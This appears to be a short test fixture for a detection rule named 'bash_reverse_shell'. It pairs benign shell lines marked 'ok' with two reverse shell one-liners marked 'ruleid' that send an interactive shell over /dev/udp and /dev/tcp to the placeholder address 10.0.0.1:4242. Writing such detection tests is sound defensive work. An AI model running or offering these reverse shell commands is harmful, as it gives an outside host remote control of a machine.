# Bash reverse shells phoning out over /dev/tcp or /dev/udp.
# ruleid: bash_reverse_shell
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
# ruleid: bash_reverse_shell
<x >/dev/tcp/10.0.0.1/4242; sh <&3 >&3 2>&3
# ok: bash_reverse_shell
echo hello from ci
# ok: bash_reverse_shell
ssh -i key.pem user@example.com
